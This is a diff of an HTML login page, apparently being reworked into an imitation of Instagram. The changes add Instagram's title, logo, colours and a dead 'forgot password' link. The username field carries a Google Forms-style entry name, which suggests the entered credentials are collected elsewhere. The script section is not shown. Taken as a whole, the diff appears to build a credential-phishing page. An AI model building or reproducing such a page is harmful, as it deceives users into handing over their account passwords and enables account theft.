@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Iniciar sesión</title>
+  <title>Iniciar sesión - Instagram</title>
   <style>
     * {
       margin: 0;
@@ -17,17 +17,21 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
-      background-color: #f0f2f5;
+      background-color: #fafafa;
     }
 
-    .login-box {
+    .login-container {
       background: white;
       padding: 30px;
       border-radius: 12px;
       box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
       text-align: center;
       width: 360px;
-      transition: opacity 0.2s ease-in-out;
+    }
+
+    .logo {
+      width: 175px;
+      margin-bottom: 20px;
     }
 
     .input-container {
@@ -62,7 +66,7 @@
       top: 8px;
       left: 10px;
       font-size: 12px;
-      color: #1877f2;
+      color: #3897f0;
     }
 
     .password-container {
@@ -78,14 +82,14 @@
       border: none;
       font-size: 14px;
       cursor: pointer;
-      color: #1877f2;
+      color: #3897f0;
       font-weight: bold;
     }
 
     .submit-btn {
       width: 100%;
       padding: 12px;
-      background-color: #1877f2;
+      background-color: #3897f0;
       color: white;
       border: none;
       border-radius: 8px;
@@ -97,21 +101,28 @@
     }
 
     .submit-btn:hover {
-      background-color: #0d65d9;
+      background-color: #2674c8;
     }
 
-    .logo {
-      font-size: 24px;
-      font-weight: bold;
-      color: #333;
-      margin-bottom: 20px;
+    .forgot-password {
+      margin-top: 15px;
+    }
+
+    .forgot-password a {
+      color: #3897f0;
+      text-decoration: none;
+    }
+
+    .forgot-password a:hover {
+      text-decoration: underline;
     }
   </style>
 </head>
 <body>
 
-<div class="login-box" id="loginBox">
-  <div class="logo">Iniciar sesión</div>
+<div class="login-container" id="loginBox">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram" class="logo">
+  
   <form id="myForm">
     <div class="input-container">
       <input type="text" id="username" name="entry.1271603301" placeholder=" " required>
@@ -126,6 +137,10 @@
 
     <button type="submit" class="submit-btn">Entrar</button>
   </form>
+
+  <div class="forgot-password">
+    <a href="#">¿Has olvidado la contraseña?</a>
+  </div>
 </div>
 
 <script>
